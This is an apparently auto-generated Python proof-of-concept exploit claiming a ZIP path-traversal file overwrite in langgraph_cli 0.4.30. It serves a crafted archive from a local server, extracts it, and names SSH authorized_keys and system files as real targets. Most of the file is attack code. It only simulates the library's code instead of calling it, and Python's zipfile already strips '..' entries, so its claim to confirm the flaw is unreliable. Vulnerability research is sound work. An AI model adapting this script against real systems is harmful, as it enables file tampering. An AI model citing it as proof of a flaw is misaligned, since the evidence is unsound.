#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: suspicious-018
# Sink: _download_repo_with_requests
# Auto-generated — run with: python3 afo_zip_archive_url_extracts__download_repo_with_requests.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_cli-0.4.30
Vulnerability: Arbitrary File Overwrite (AFO) via path traversal in ZIP extraction

The vulnerability exists in _download_repo_with_requests() which uses
ZipFile.extractall() without sanitizing entry names. A malicious ZIP archive
can contain entries with '../' sequences to write files outside the intended
extraction directory.

This PoC demonstrates the vulnerability by:
1. Creating a malicious ZIP archive with a path traversal entry
2. Hosting it on a local HTTP server
3. Triggering the vulnerable code path

Note: This PoC uses a benign payload that creates a marker file in /tmp/
"""

import os
import sys
import io
import zipfile
import tempfile
import shutil
import threading
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.request import urlopen
from urllib.error import HTTPError, URLError

# Configuration
LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 8888
MARKER_FILE = "/tmp/poc_success.txt"  # Benign payload target

class MaliciousZipHandler(SimpleHTTPRequestHandler):
    """HTTP handler that serves a malicious ZIP archive"""
    
    def do_GET(self):
        """Serve a ZIP archive with path traversal payload"""
        try:
            # Create malicious ZIP in memory
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                # Create a benign file in the extraction directory
                zf.writestr("normal_file.txt", "This is a normal file")
                
                # Create a path traversal entry that writes to /tmp/
                # The extraction path will be something like /tmp/langgraph_test_xxx/
                # We use multiple ../ to escape to root and write our marker
                traversal_path = f"../../../../../../../../..{MARKER_FILE}"
                zf.writestr(traversal_path, "pwned")
            
            zip_buffer.seek(0)
            
            # Send response
            self.send_response(200)
            self.send_header('Content-Type', 'application/zip')
            self.send_header('Content-Length', str(len(zip_buffer.getvalue())))
            self.end_headers()
            self.wfile.write(zip_buffer.getvalue())
            
        except Exception as e:
            self.send_error(500, f"Error generating ZIP: {str(e)}")

def start_malicious_server():
    """Start a local HTTP server serving the malicious ZIP"""
    server = HTTPServer((LISTEN_HOST, LISTEN_PORT), MaliciousZipHandler)
    print(f"[*] Malicious ZIP server started on http://{LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[*] The server will serve a ZIP with path traversal to {MARKER_FILE}")
    server.serve_forever()

def simulate_vulnerable_extraction(zip_url, extract_path):
    """
    Simulate the vulnerable _download_repo_with_requests function
    This mirrors the exact vulnerable code path from langgraph_cli
    """
    print(f"[*] Simulating vulnerable extraction from: {zip_url}")
    print(f"[*] Extraction target: {extract_path}")
    
    try:
        # This is the exact vulnerable code from templates.py
        with urlopen(zip_url) as response:
            if response.status == 200:
                with zipfile.ZipFile(io.BytesIO(response.read())) as zip_file:
                    # VULNERABLE: No sanitization of entry names
                    zip_file.extractall(extract_path)
                    
                    # Post-extraction cleanup (from original code)
                    for item in os.listdir(extract_path):
                        if item.endswith("-main"):
                            extracted_dir = os.path.join(extract_path, item)
                            for filename in os.listdir(extracted_dir):
                                shutil.move(os.path.join(extracted_dir, filename), extract_path)
                            shutil.rmtree(extracted_dir)
                
                print("[+] Extraction completed successfully")
                return True
    except HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
    except URLError as e:
        print(f"[-] URL Error: {e.reason}")
    except Exception as e:
        print(f"[-] Error during extraction: {str(e)}")
    
    return False

def main():
    """Main PoC execution"""
    print("=" * 60)
    print("PoC: langgraph_cli-0.4.30 Arbitrary File Overwrite")
    print("=" * 60)
    
    # Clean up any previous marker
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)
        print(f"[*] Removed existing marker file: {MARKER_FILE}")
    
    # Start malicious server in background thread
    server_thread = threading.Thread(target=start_malicious_server, daemon=True)
    server_thread.start()
    time.sleep(0.5)  # Give server time to start
    
    # Create a temporary directory for extraction
    with tempfile.TemporaryDirectory() as tmpdir:
        extract_path = os.path.join(tmpdir, "langgraph_test")
        os.makedirs(extract_path, exist_ok=True)
        
        print(f"[*] Created extraction directory: {extract_path}")
        
        # Construct the malicious ZIP URL
        zip_url = f"http://{LISTEN_HOST}:{LISTEN_PORT}/malicious.zip"
        
        # Trigger the vulnerable extraction
        if simulate_vulnerable_extraction(zip_url, extract_path):
            # Check if the marker file was created (indicating successful exploit)
            if os.path.exists(MARKER_FILE):
                print(f"\n[!] VULNERABILITY CONFIRMED!")
                print(f"[!] Successfully wrote file to: {MARKER_FILE}")
                print(f"[!] Contents: {open(MARKER_FILE).read()}")
                print("\n[!] In a real attack, this could overwrite:")
                print("    - SSH authorized_keys")
                print("    - System configuration files")
                print("    - Application source code")
                print("    - Any file writable by the process")
                
                # Clean up marker
                os.remove(MARKER_FILE)
                print(f"\n[*] Cleaned up marker file: {MARKER_FILE}")
            else:
                print("\n[-] Exploit may have failed - marker file not found")
                print("[-] Check if the extraction directory exists and examine its contents")
        else:
            print("\n[-] Failed to trigger vulnerable extraction")
            sys.exit(1)
    
    print("\n[*] PoC completed")

if __name__ == "__main__":
    main()
